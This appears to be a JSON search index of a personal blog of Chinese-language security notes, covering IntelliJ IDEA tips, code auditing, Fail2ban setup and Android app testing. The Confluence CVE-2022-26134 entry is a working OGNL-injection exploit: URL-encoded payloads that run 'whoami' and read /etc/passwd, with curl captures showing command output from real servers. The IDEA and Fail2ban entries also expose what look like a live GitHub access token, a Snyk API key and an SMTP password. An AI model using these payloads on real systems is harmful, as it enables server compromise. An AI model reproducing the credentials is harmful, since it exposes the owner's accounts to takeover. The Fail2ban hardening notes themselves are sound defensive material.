[{"content":"Markdown here\n","description":"test post","id":0,"section":"red","tags":null,"title":"April 2019","uri":"http://crkmythical.github.io/red/aaa/2019_april/"},{"content":"Markdown here\n","description":"test post","id":1,"section":"red","tags":null,"title":"May 2019","uri":"http://crkmythical.github.io/red/2019_may/"},{"content":"Markdown here\n","description":"test post","id":2,"section":"dso","tags":null,"title":"Basic Usage","uri":"http://crkmythical.github.io/dso/gettingstarted/basicusage/"},{"content":"Markdown here\n","description":"test post","id":3,"section":"red","tags":null,"title":"April 2019","uri":"http://crkmythical.github.io/red/2019_april/"},{"content":"Markdown here\n","description":"test post","id":4,"section":"dso","tags":null,"title":"Configuration","uri":"http://crkmythical.github.io/dso/gettingstarted/configuration/"},{"content":"Markdown here\n","description":"test post","id":5,"section":"red","tags":null,"title":"March 2019","uri":"http://crkmythical.github.io/red/2019_march/"},{"content":"Markdown here\n","description":"test post","id":6,"section":"dso","tags":null,"title":"Installation","uri":"http://crkmythical.github.io/dso/gettingstarted/installation/"},{"content":"Markdown here\n","description":"test post","id":7,"section":"red","tags":null,"title":"February 2019","uri":"http://crkmythical.github.io/red/2019_february/"},{"content":"Markdown here\n","description":"test post","id":8,"section":"dso","tags":null,"title":"Quick Start","uri":"http://crkmythical.github.io/dso/gettingstarted/quickstart/"},{"content":"Markdown here\n","description":"test post","id":9,"section":"red","tags":null,"title":"January 2019","uri":"http://crkmythical.github.io/red/2019_january/"},{"content":"IntelJ Idea 教程 https://github.com/judasn/IntelliJ-IDEA-Tutorial\n1  brew install --cask intellij-idea   License Server\nSettings Import/Export  导出配置   IDEA 偏好设置 全局配置打开偏好设置\nAppearance \u0026amp; Behavior System Settings Keymap https://cdk8s.gitbook.io/github/keymap-mac-introduce\n常用快捷键    Ctrl+h 查看当前类的层次结构      Command+7 查看类结构    Command+O 快速搜索类    Command +F 关键字检索(当前文件) 全局 Command+Shift+F   Command+Alt +B 查看方法/类的实现类    Alt + F7 查看调用链(方法被调用的情况) Find Usages   Command+E 查看最近使用的文件    Shift+ Alt+Command+U 查看可视化类继承链    Command+/ 行注释 Shift+Command+/ 块注释   /** 方法/类注释 可自定义类模板    可视化类继承链\nEditor Editor-\u0026gt;General   自动导入\n  Appearnace\n  Code Completion  Editor Tabs  Postfix Completion var声明 null判空 notnull判非空 nn判非空 for遍历 fori带索引的遍历 not取反 if条件判断 cast强转 return返回值 Editro-\u0026gt;Code Editing Font Color Scheme Code Style Inspections 各类文件类型图标 File and Code Templates  File Header    Class\n  Interface\n  Enum\n  File Encodings BOM（byte-order mark），即字节顺序标记，它是插入到以UTF-8、UTF16或UTF-32编码Unicode文件开s头的特殊标记，用来识别Unicode文件的编码类型。对于UTF-8来说，BOM并不是必须的，因为BOM用来标记多字节编码文件的编码类型和字节顺序（big-endian或little-endian）。\n　不含BOM的UTF-8才是标准形式，UTF-8不需要BOM\n带BOM的UTF-8文件的开头会有U+FEFF，所以我新建的空文件会有3字节的大小。\nLive Templates File Types 隐藏项目中 .idea目录\nInlay Hints -Java Copyright Plugins 常用插件 Theme - Nord / One Dark / Xcode-Dark Dash Edutool Stackoverflow 时序图-SequenceDigram 项目代码统计 Statistic 快捷键展示Presentation Assistant 阿里巴巴 Java 代码规范- Alibaba Java Code Guidelines MybatisX 高效操作Mybatis插件 Mybatis-log-plugin Codota— 代码智能提示 必备的翻译插件-Translation GitToolBox-显示代码提交时间 Key Promoter X 快捷键提示插件 Rainbow Brackets ——让你的括号变成不一样的颜色，防止错乱括号 Leetcode Editor 可以在IDEA中在线刷题。 Java Stream Debugger —— Stream 将操作步骤可视化 Insomnia-防止休眠 Lombok Maven Helper Translation arthas idea JRebel 热部署插件 安全插件 SpotBugs https://github.com/find-sec-bugs/find-sec-bugs/wiki/IntelliJ-Tutorial\nBlack Duck SCA WhiteSource Advise Momo Code Sec Inspector Java Decompiler(JD-GUI) Jadx Android Decompiler Snyk CMD模式 1 2  brew tap snyk/tap \u0026amp;\u0026amp; brew install snyk snyk config set api c70b7d5a-1a74-44df-b52c-3ab5c80d12e6   IDE模式 先配置JAVA_HOME\n1 2 3 4 5 6  echo \u0026#39; ## JDK export JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home export PATH=$JAVA_HOME/bin:$PATH \u0026#39; \u0026gt;\u0026gt; ~/.zshrc   jclasslib bytecode viewer 查看字节码 Jadx Android Decompiler RIPS Security Analysis Restful Fast Request——IDEA版Postman MurphySec Code Scan snyk SonarLint 代码质量检查插件 Version Control 与Gitlab集成 Build, Excution,Deployment Maven Compiler Debug 当调用ConcurrentLinkedQueue类的toString()方法时会获取队列的迭代器，而创建迭代器时会调用队列的first()方法，在first()方法里会修改head的属性，从而导致输出的结果不一致\n在远程调试时，我们发现有些类的断点一直断不上问题，该问题可能出在 IntelliJ 的 Settings -\u0026gt; Debugger -\u0026gt; Stepping 配置上。若勾选了 Do not step into the classes，则会让这些断点失效:\n本地调试 远程调试 对第三方jar包进行调试   创建工程，将jar包添加到依赖库中\n  在Main函数处打断点，添加调试配置，运行程序，点击debug\n  https://cdk8s.gitbook.io/github/debug-introduce\nLanguage \u0026amp; Frameworks Tools Setting Repository- 使用git仓库保存Idea配置文件Settings Access-Token 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\nAdvanced Settings Other Settings 代码对比效果图\n","description":"","id":14,"section":"dso","tags":null,"title":"IDEA","uri":"http://crkmythical.github.io/dso/idea/"},{"content":" halo  sdfsf\n  ","description":"","id":15,"section":"red","tags":null,"title":"Linux","uri":"http://crkmythical.github.io/red/linux/"},{"content":"Table of Contents  代码审计常规手法  Front Back 审计流程四步骤  Front Back      \n代码审计常规手法 \nFront 代码审计常规手法\n\nBack  通读源码: 从入口函数开始读 关键函数回溯: 先定位敏感函数及参数,同步回溯参数赋值过程,判断是否可控以及是否经过过滤等 追踪功能点: 根据经验判断可能存在问题的路由或功能点,对该功能点进行通读  \n审计流程四步骤 \nFront 审计流程四步骤\n\nBack  1.获取源码,搭建环境: Github、GitLab、CSDN、Gitee等 2.半自动化代码审计: SAST工具扫描,功能点审计、关键函数溯源、通读源码 3.POC编写: 根据审计结果以及触发方式编写POC,通过POC确定问题及造成影响 4.报告编写: 根据审计出的安全问题和POC脚本的验证结果,编写整体的代码审计报告  ","description":"","id":17,"section":"dso","tags":[""],"title":"Devsecops是什么","uri":"http://crkmythical.github.io/dso/devsecops%E6%98%AF%E4%BB%80%E4%B9%88/"},{"content":"helo\nsdfsjalkjal;fkjaljdkj\n","description":"","id":18,"section":"blog","tags":null,"title":"Halo","uri":"http://crkmythical.github.io/blog/halo/"},{"content":"编写进度\n   Atlassian_Confluence-CVE-2022-26134 测试payload\n1 2 3  ${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u0026#34;cat /etc/passwd\u0026#34;).getInputStream(),\u0026#34;utf-8\u0026#34;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\u0026#34;X-Cmd-Response\u0026#34;,#a))} /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/   exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14  curl -I -k \u0026#34;http://{host}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/\u0026#34; HTTP/1.1 302 X-ASEN: SEN-16357695 X-Confluence-Request-Time: 1654478089003 Set-Cookie: JSESSIONID=A34182817EBFE6F7FA068AFB7582E98E; Path=/; HttpOnly X-XSS-Protection: 1; mode=block X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN Content-Security-Policy: frame-ancestors \u0026#39;self\u0026#39; X-Cmd-Response: confluence Location: /login.action?os_destination=%2F%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D%2Findex.action\u0026amp;permissionViolation=true Content-Type: text/html;charset=UTF-8 Transfer-Encoding: chunked Date: Mon, 06 Jun 2022 01:14:49 GMT   example 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  curl -I -k \u0026#34;https://{host}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/\u0026#34; HTTP/2 302 date: Mon, 06 Jun 2022 01:27:10 GMT content-type: text/html;charset=UTF-8 cache-control: private expires: Thu, 01 Jan 1970 02:00:00 IST x-asen: SEN-15222703 x-confluence-request-time: 1654478830348 x-confluence-cluster-node: 31b036c8 p3p: CP=\u0026#34;IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT\u0026#34; set-cookie: JSESSIONID=18114A6EC984E7571933004E790DF93F; Path=/; Secure; HttpOnly x-xss-protection: 1; mode=block x-content-type-options: nosniff x-cmd-response: nt authority\\system location: /login.action?os_destination=%2F%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D%2Findex.action\u0026amp;permissionViolation=true cf-cache-status: DYNAMIC expect-ct: max-age=604800, report-uri=\u0026#34;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\u0026#34; server: cloudflare cf-ray: 716d5d2b3f2bf8a7-NRT alt-svc: h3=\u0026#34;:443\u0026#34;; ma=86400, h3-29=\u0026#34;:443\u0026#34;; ma=86400   ","description":"","id":19,"section":"blog","tags":null,"title":"Atlassian_Confluence-CVE-2022-26134.md","uri":"http://crkmythical.github.io/blog/atlassian-confluence-md/"},{"content":"编写进度\n   (58 条消息) 有类似专门研究学习方法的书吗? - 知乎 (zhihu.com)\n《认知天性》推荐的学习法-\u0026lt;检索练习\u0026gt; what-什么是检索练习  [!faq] 什么是检索练习\n 费曼学习，温故而知新，可以为师也   why-为什么要用检索练习学习知识  [!summary] 从记忆中检索知识有两大显著的好处：\n 是明确已知和未知，合理分配精力 强化新知与已知之间的联系，方便今后回忆检索，可以有效地中止遗忘。 被忘掉的不是知识本身，而是能让你找到并检索这些知识的线索。 知识最终将变成条件反射   how-如何高效地进行检索练习  [!faq] 如何提高检索练习的效率?\n检索某件事物所耗费的努力越多，你学得就越扎实 正是感觉到学习更吃力时，记忆才更为长久、牢固。\n 间隔/重复检索  使用anki学习/复习 定期自测，重新校准已知和未知。可以防止遗忘，强化检索路径，而且对于保存你想要掌握的知识来说至关重要。   穿插/多样检索 ,  交替学习/复习， 同一事物的多样性，从不同角度学习/复习 有助于我们更好地学习如何评估背景，以及辨识问题间的差异，从一系列可选的答案中选择并应用正确的解决方案。   反思及细化  为新资料提供一种比喻或视觉形象 把资料和你已知的东西联系起来，用自己的语言向别人解释，或者解释这些资料与你的课外生活有什么联系。     学习误区 关于艾宾浩斯曲线意义的误解  [!warning] - [ ] 艾宾浩斯曲线毫无意义\n不同的事物，不同的人，不同的状态，你的记忆效果都会不一样。\n 一件事情多快被遗忘，很大程度上取决于这件事对我们的重要程度。   低效学习方式有哪些  [!warning] 低效学习方法\n那些方法并没有给大脑带来挑战，没法起到巩固的作用，只会让人误以为自己已经掌握了。用今天流行的话讲就是：你只是假装很努力！\n 反复阅读 , 反复阅读的效果是边际递减的 划线 摘抄 长时间盯着笔记与课本 记笔记 (指上课时想把老师说的话全部记下来的行为)   为什么无法从不擅长的事情里学到知识？  [!faq] 为什么无法从不擅长的事情里学到知识\n即便有人能得到负面反馈，他们还必须准确理解为什么会失败。\n要成功需要做对所有的事情。\n相反，失败则可以归结到任何一个外部理由上：做不好事情怪工具不合适是很容易的。\n 为什么穿插练习的效果更好？  [!faq] 为什么穿插练习的效果更好？\n把不同类型的问题或样本混合起来学习，可以提高你区别问题类型的能力，辨识出同一类型问题的普遍特点，并且能提高你在今后测验或真实环境中的成功率。\n在现实世界中，你必须能够识别要解决问题的类型，才能运用正确的解决方案。\n 复习间隔多久为宜？  [!faq] 间隔检索练习，间隔多久最为合适?\n从最低限度上说，间隔的时间足够出现一点儿遗忘就对了。\n在两次练习间至少间隔一天应该是不错的做法。\n ","description":"","id":20,"section":"blog","tags":[""],"title":"《认知天性》中关于学习方法的见解","uri":"http://crkmythical.github.io/blog/%E8%AE%A4%E7%9F%A5%E5%A4%A9%E6%80%A7%E4%B8%AD%E5%85%B3%E4%BA%8E%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95%E7%9A%84%E8%A7%81%E8%A7%A3/"},{"content":"编写进度\n   Fail2ban Fail2Ban 是入侵检测软件框架，保护计算机免受暴力破解（brute-force attack）。以 Python 语言编写，能运行于具有包（packet）控制或防火墙的 POSIX 系统，如 iptables 或 TCP Wrapper.\nFail2Ban可以通过描日志文件并用正则匹配分析，然后通过更新防火墙规则来禁止某些有恶意迹象的 IP（密码失败过多，寻求漏洞利用等）来提高服务器安全性。\nfail2ban安装/开机自启 1 2 3 4  apt install fail2ban yum install fail2ban systemctl restart fail2ban systemctl enable fail2ban.service # 开机自启   配置文件 /etc/fail2ban/  /etc/fail2ban/filter.d/：条件文件夹, 内含默认文件，用于定义日志文件内容的过滤规则,其中预设于了 SSH、Nginx、Apache 的监控规则 /etc/fail2ban/action.d/：动作文件夹, 发现恶意 IP 后采取的操作，其中预设了许多常用操作，其中预设了 iptables、firewalld、sendmail 等操作 /etc/fail2ban/jail.d：配置文件夹, Jail 由 Filter 和 Action 组成，用于定义错误次数、封禁时长、封禁动作等 /etc/fail2ban/jail.conf ：定义 fai2ban 自身的日志级别、日志位置等  当 filter 文件监视到的错误记录条数在 jail 中定义的时间内达到 jail 中定义的次数后，告知系统 iptables 执行封禁动作及封禁时长。在封禁时长到期时，告知 iptables 解除封禁。\n配置过滤规则  /etc/fail2ban/filter.d/\u0026lt;fiter-name\u0026gt;.local  首先设置过滤规则，在 /etc/fail2ban/filter.d/ 目前下新建一个 .conf 文件，名字自取，比如我新建的是 nginx-zatp-com.conf，然后进行设置：\n[Definition] failregex = ignoreregex = 其中：\nfailregex：表示过滤规则的正则表达式；\nignoreregex：表示忽略规则的正则表达式，可以设置为 .*(webp|svg|jpg|png) 忽略对图片文件的请求，防止图片文件过多误伤；\n而这里要实现我们想要的效果，也有两个选择，配合开篇提到的 Nginx 流控产生的日志文件（error.log）进行匹配过滤或者直接对 Nginx 的访问日志文件（access.log）进行匹配过滤。原理都一样，fail2ban 预置了很多常见服务的日志文件匹配模板，在 /etc/fail2ban/filter.d/ 目录下可以找到。如果你修改了日志格式，那么需要根据你的日志文件格式改写相应的表达式。\n这里我用 Nginx 的 limit_req_zone 流控模块做一个示例，下面是一条超过限制产生的错误信息：\n2021/10/13 01:02:39 [error] 14174#0: *41792 limiting requests, excess: 5.920 by zone \u0026quot;request\u0026quot;, client: x.x.x.x, server: www.zatp.com, request: \u0026quot;HEAD /?feed=rss HTTP/2.0\u0026quot;, host: \u0026quot;www.zatp.com\u0026quot; 参考自带的 /etc/fail2ban/filter.d/nginx-limit-req.conf 模板，可以写成下面的表达式：\n[Definition] failregex = ^\\s*\\[[a-z]+\\] \\d+#\\d+: \\*\\d+ limiting requests, excess: [\\d\\.]+ by zone \u0026quot;.*\u0026quot;, client: \u0026lt;HOST\u0026gt;, ignoreregex = failregex 也可以直接简写为：\nfailregex = limiting requests, excess:.* by zone.*client: \u0026lt;HOST\u0026gt; 其中 \u0026lt;HOST\u0026gt; 是必须包含的，fail2ban 通过这个来获取 IP 地址，测试自定义的规则是否生效：\nfail2ban-regex /var/log/nginx/access.log /etc/fail2ban/filter.d/nginx-zatp-com.conf 如果成功匹配会返回匹配到的信息：\nResults ======= Failregex: 4 total |- #) [# of hits] regular expression | 1) [4] ^\\s*\\[[a-z]+\\] \\d+#\\d+: \\*\\d+ limiting requests, excess: [\\d\\.]+ by zone \u0026quot;.*\u0026quot;, client: \u0026lt;HOST\u0026gt;, `- Ignoreregex: 0 total 配置Jail规则 Fail2ban在安装时会创建两个默认的配置文件:\n /etc/fail2ban/jail.d/defaults-debian.conf /etc/fail2ban/jail.conf\n我们不建议直接修改这些文件，因为更新Fail2ban时它们可能会被覆盖。  Fail2ban将按以下顺序读取配置文件。每个.local文件都会覆盖.conf文件中的设置：\n /etc/fail2ban/jail.conf /etc/fail2ban/jail.d/*.conf /etc/fail2ban/jail.local /etc/fail2ban/jail.d/*.local  创建自定义配置文件 1 2 3  cp /etc/fail2ban/jail.{conf,local} ignoreip = 127.0.0.1/8 ::1 123.123.123.123 192.168.1.0/24    [jail_name] : jail的名称 enabled : 可以设置为true或false以启用/禁用过滤器 port : 运行服务的端口，如果使用的端口是默认端口，则可以使用服务名称，否则需要明确指定端口号 filter : 位于/etc/fail2ban/filter.d/目录中的过滤器文件的名称(需要与自定义规则里的名称一致，不需要.conf后缀)，其中包含用于解析日志的fileregex信息 logpath: fail2ban检测的日志文件路径 backend : 用于获取日志文件修改的后端 auto ignoreip : 设置白名单ip地址,以空格分隔多个ip/ip段 banaction : 实时锁定行动的类型 action : iptables-allports 如果被触发，执行怎样的脚本？ banaction_allports : Fail2ban阻止每个端口上的远程IP地址 bantime : 锁定时长,默认单位为秒, 默认10m ，值-1将永久禁止IP地址 maxretry : 允许IP失败尝试次数。 默认值设置为5， findtime : 重试次数之前的持续时间  1 2 3  findtime=10m maxretry=3 bantime=1d   表示 findtime(10m)中内失败次数达到maxretry(3)次则锁定bantime(1d)\n邮件通知 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  apt install -y bsd-mailx sendmail systemctl restart sendmail.service cat \u0026lt;\u0026lt;EOF \u0026gt;\u0026gt; /etc/mail.rc set bsdcompat set from= 741474596@qq.com set smtp=smtp.qq.com:465 set smtp-auth-user=741474596@qq.com set smtp-auth-password=gkotyjhergynbdjh set smtp-auth=login #启用ssl加密 set smtp-user-starttls set ssl-verify=ignore #ssl的加密证书 set nss-config-dir=/etc/ssl/certs EOF # 测试发送邮件 echo \u0026#34;邮件内容\u0026#34; |mail -v -s \u0026#34;邮件标题\u0026#34; xxx@xxx.com mail -s \u0026#34;theme\u0026#34; xx@xxx.com \u0026lt; message.txt   Fail2ban可以在IP被禁止时发送电子邮件警报。 要接收电子邮件，您需要在服务器上安装SMTP并更改默认的action，该action操作仅将IP禁止为%(action_mw)s，如下所示：\n# /etc/fail2ban/jail.local action = %(action_mw)s %(action_mw)s将禁止有问题的IP，并发送包含Whois报告的电子邮件。 如果要在电子邮件中包含相关日志，请将操作设置为%(action_mwl)s。您还可以调整发送和接收电子邮件地址：\n# /etc/fail2ban/jail.local destemail = admin@myfreax.com sender = root@myfreax.com 配置Fail2ban telegram 机器人通知 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90  #创建Telegram 机器人为关注`Botfather`，按提示操作即可， #可查找机器人Token，添加`userinfobot`查找自己聊天ID #在/etc/fail2ban/action.d/中新建telegram.conf文件并写入 [Definition] actionstart = /etc/fail2ban/scripts/send_telegram_notif.sh -a start actionstop = /etc/fail2ban/scripts/send_telegram_notif.sh -a stop actioncheck = actionban = /etc/fail2ban/scripts/send_telegram_notif.sh -n \u0026lt;name\u0026gt; -b \u0026lt;ip\u0026gt; actionunban = /etc/fail2ban/scripts/send_telegram_notif.sh -n \u0026lt;name\u0026gt; -u \u0026lt;ip\u0026gt; [Init] init = 123``` ```bash #在/etc/fail2ban/中新建scripts目录，并新增send_telegram_notif.sh脚本文件写入 #!/bin/bash # Version 1.0 # Send Fail2ban notifications using a Telegram Bot # Add to the /etc/fail2ban/jail.conf: # [sshd] # *** # action = iptables[name=SSH, port=22, protocol=tcp] # telegram # Create a new file in /etc/fail2ban/action.d with the following information: # [Definition] # actionstart = /etc/fail2ban/scripts/send_telegram_notif.sh -a start # actionstop = /etc/fail2ban/scripts/send_telegram_notif.sh -a stop # actioncheck = # actionban = /etc/fail2ban/scripts/send_telegram_notif.sh -n \u0026lt;name\u0026gt; -b \u0026lt;ip\u0026gt; # actionunban = /etc/fail2ban/scripts/send_telegram_notif.sh -n \u0026lt;name\u0026gt; -u \u0026lt;ip\u0026gt; # # [Init] # init = 123 # Telegram BOT Token telegramBotToken=\u0026#39;xxxxx\u0026#39; #此处替换为自己Telegram 机器人Token # Telegram Chat ID telegramChatID=\u0026#39;xxxxx\u0026#39;#此处替换为自己的Chat ID function talkToBot() { message=$1 curl -s -X POST https://api.telegram.org/bot${telegramBotToken}/ sendMessage -d text=\u0026#34;${message}\u0026#34;-d chat_id=${telegramChatID} \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 } if[ $# -eq 0 ]; then echo \u0026#34;Usage $0-a ( start || stop ) || -b $IP|| -u $IP\u0026#34; exit 1; fi while getopts \u0026#34;a:n:b:u:\u0026#34; opt; do case\u0026#34;$opt\u0026#34;in a) action=$OPTARG ;; n) jail_name=$OPTARG ;; b) ban=y ip_add_ban=$OPTARG ;; u) unban=y ip_add_unban=$OPTARG ;; ?) echo \u0026#34;Invalid option. -$OPTARG\u0026#34; exit 1 ;; esac done if[[ ! -z ${action} ]]; then case\u0026#34;${action}\u0026#34;in start) talkToBot \u0026#34;Fail2ban has been started on `hostname`.\u0026#34; ;; stop) talkToBot \u0026#34;Fail2ban has been stopped on `hostname`.\u0026#34; ;; *) echo \u0026#34;Incorrect option\u0026#34; exit 1; ;; esac elif[[ ${ban} == \u0026#34;y\u0026#34;]]; then talkToBot \u0026#34;[${jail_name}] The IP: ${ip_add_ban}has been banned on `hostname`.\u0026#34; exit 0; elif[[ ${unban} == \u0026#34;y\u0026#34;]]; then talkToBot \u0026#34;[${jail_name}] The IP: ${ip_add_unban}has been unbanned on `hostname`.\u0026#34; exit 0; else info fi   1 2 3 4 5 6 7  #给send_telegram_notif.sh脚本添加可执行权限 chmod +x send_telegram_notif.sh #修改jail.local配置文件，将启用的jail的action下添加一个telegram，如下 action = iptables[name=SSH,port=2202,protocol=tcp] telegram #重启fail2ban验证 systemctl restart fail2ban   Telegram 机器人告警通知效果如图\n激活fail2ban 1 2 3  systemctl restart fail2ban service fail2ban restart   检测生效脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  #!/bin/bash for ((i=1;i\u0026lt;=50;i++)); do curl -H \u0026#34;Fail2ban test\u0026#34; https://your-domian/test \u0026gt; /dev/null 2\u0026gt;\u0026amp;1 done echo \u0026#34;done\u0026#34;``` # 使用Fail2ban客户端 `fail2ban-client \u0026lt;COMMAND\u0026gt;` 以下是 Fail2ban-client 命令列表： - `start`: 用于启动fail2ban服务器和jails - `reload`: 用于重新加载 Fail2ban 配置 - `stop`: 停止服务器 - `status`: 用于检查服务器状态并启用 jails - `status JAIL` : 显示监狱的状态和当前被禁止的 IP ## 查看所有命令 ```shell fail2ban-client -help   检查启动状态 1 2 3 4 5 6 7 8 9 10  fail2ban-client ping # 正确启动的话fail2ban会以pong作为回应(Server replied: pong) sudo fail2ban-client version #查看 Fai2ban 的版本 sudo fail2ban-client ping #检查 Fail2ban 是否正常运行（正常将显示 pong） sudo systemctl start fail2ban #启动 Fail2ban sudo systemctl stop fail2ban #停止 Fail2ban sudo systemctl restart fail2ban #重启 Fail2ban sudo tail -f /var/log/fail2ban.log #打开 Fail2ban 的日志监控 sudo iptables --list -n #显示系统当前 iptables sudo iptables -D INPUT -s xxx.xxx.xxx.xxx -j DROP #解除封禁的 IP   查看指定 Jail 规则下被封禁的IP情况 1  fail2ban-client status [jailname]   封禁/解封限制IP sudo fail2ban-client set \u0026lt;jailname\u0026gt; banip/unbanip \u0026lt;IP\u0026gt;\n1 2  sudo fail2ban-client set sshd banip 23.34.45.56 sudo fail2ban-client set sshd unbanip 23.34.45.56   添加/解除指定IP的忽略 1  fail2ban-client set \u0026lt;JAIL\u0026gt; addignoreip/delignoreip \u0026lt;IP\u0026gt;   验证自定义规则 1  fail2ban-regex [OPTIONS] \u0026lt;LOG\u0026gt; \u0026lt;REGEX\u0026gt; [IGNOREREGEX]    LOG为需要匹配的日志文件路径， REGEX为正则表达式所在的文件路径(通常位于filter.d文件夹内)  以下为常用的OPTIONS\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // Do not print any missed lines --print-no-missed // Do not print any ignored lines --print-no-ignored // Print all matched lines --print-all-matched // Print all missed lines, no matter how many --print-all-missed // Print all ignored lines, no matter how many --print-all-ignored   查看fail2ban的日志 1  tail -f /var/log/fail2ban.log   ","description":"","id":21,"section":"blog","tags":null,"title":"Fail2ban","uri":"http://crkmythical.github.io/blog/fail2ban/"},{"content":"编写进度\n   Table of Contents  Android App安全基础  Android APP生成过程 安全测试工具  静态分析工具 - 测试App是否存在防反编译和防篡改的问题 动态分析工具 - 测试防调试、防注入、防内存转储、漏洞测试等问题 数据包分析工具- 测试数据通信时存在明文传输、数据弱加密、中间人攻击漏洞 挂钩工具 - 解决加密时上述工具无法使用的问题   App相关的信息资产   程序代码安全测试 - APP文件、程序进程  运行环境测试 防反编译测试  反编译工具检测 代码混淆检测 混淆强度检测 关键代码(敏感逻辑和数据保护)检测   防篡改测试  程序文件防篡改检测   防调试测试  调试工具防护检测 调试行为防护检测 内存防护检测   防注入测试  进程防护检测     服务交互安全测试 - 程序进程、前段界面、接口端口  进程间交互  检测目的 检测方法 检测结论 修复建议   屏幕交互  界面劫持检测 防截/录屏检测   WebView交互  克隆攻击检测 WebView安全检测   接口端口交互  对象反序列化检测 Wormhole漏洞检测     鉴权认证安全测试 - 接口端口、内存数据、网络通信  注册过程测试  注册信息保护检测 注册信息传输检测 注册过程防爆破检测 注册过程防嗅探检测   登陆过程测试  密码安全验证检测 登陆信息加密传输检测 登陆过程防爆破检测 登陆过程防嗅探检测 登陆过程防绕过检测 加强认证检测   会话过程测试  有状态会话标志检测 无状态会话Token检测 会话不活跃检测 加强认证检测   登出过程测试  会话终止检测 残留数据检测   注销过程测试  重新注册检测 数据清除检测     本地数据安全测试 - 内存数据、本地存储  数据创建测试  用户协议检测 数据采集检测 数据输入检测 数据生成检测   数据存储测试  访问控制检测 数据加密检测   数据处理测试  程序日志检测 敏感数据不当使用检测   数据共享测试  第三方SDK用户协议检测 与第三方SDK数据共享检测   数据备份测试  敏感数据备份检测 备份数据加密强度检测   数据销毁测试  后台运行数据检测 敏感数据清除检测     网络传输安全测试 - 网络通信  安全传输层测试  TLS实现检测 CA证书检测 证书校验检测 主机名校验   数据加密检测  检测目的 检测方法 检测结论 修复建议   中间人攻击测试  HTTP中间人会话劫持检测 HTTPS中间人会话劫持检测     App加固技术  \nAndroid App安全基础 \nAndroid APP生成过程 graph LR java[.java文件] --\u0026gt;|javac|cls[.class文件] cls[.class文件] --\u0026gt; dx[dx] jar[.jar文件] --\u0026gt; dx[dx] dx[dx] --\u0026gt; dex[class.dex] dex[class.dex] --\u0026gt;|dex2oat| oat[oat格式的class.dex文件] dex[class.dex] --\u0026gt;aapt[aapt] resource[resource] --\u0026gt;aapt[aapt] aapt --\u0026gt; .apk文件 .apk文件 --\u0026gt; jarsigner jarsigner--\u0026gt; zipalign zipalign --\u0026gt; signsign[signed .apk文件]   通过~javac~ 将java源代码生成字节码.class文件 通过~dx –dex –output=class.dex Test.class~将.class文件和jar包生成Android App可执行文件class.dex\noat格式文件是android系统自带的ELF文件格式，包括classes.dex文件内容，及classes.dex文件转换的机器指令，存储在~/data/dalbik-cache/arm/data@App@com.demo.test-1@test.apk@classes.dex~ 通过~aapt~将.dex文件和其他音视频资源文件打包成.apk文件 通过jarsigner对生成的apk文件进行数字签名，防止APP被篡改 通过zipalign使apk文件压缩部分在字节边界上使对齐  \n安全测试工具 \n静态分析工具 - 测试App是否存在防反编译和防篡改的问题   apktool 检测防篡改能力\n  反编译\njava -jar apktool.jar d -f Test.apk    重打包\njava -jar apktool.jar b -f directory_name -o Test.apk java -jar signapk.jar testkey.x509.pem testkey.pk8 old.apk new.apk      baksmali 作用 classes.dex -反编译-\u0026gt; smali\njava -jar baksmali.jar classes.dex -o smalifile    smail 作用 smali –\u0026gt; classes.dex\njava -jar smali.jar smalifile -o classes.dex    dex2jar 作用 dex –\u0026gt; jar\nsh d2j-dex2jar.sh -f ~/path/to/apk_to_decompile.apk    jd-gui 作用 展示jar包中源码\n  jeb 用于逆向工程/审计apk文件的反编译工具\n  \n动态分析工具 - 测试防调试、防注入、防内存转储、漏洞测试等问题  DDMS(Dalvik debug monitor service)是安卓开发环境中的Dalvik虚拟机调试监控服务 gdb(GNU project debugger)是LInux系统的GCC调试工具 IDA Pro 逆向神器 脱壳 Drozer是一个进行综合安全评估的Android安全测试框架  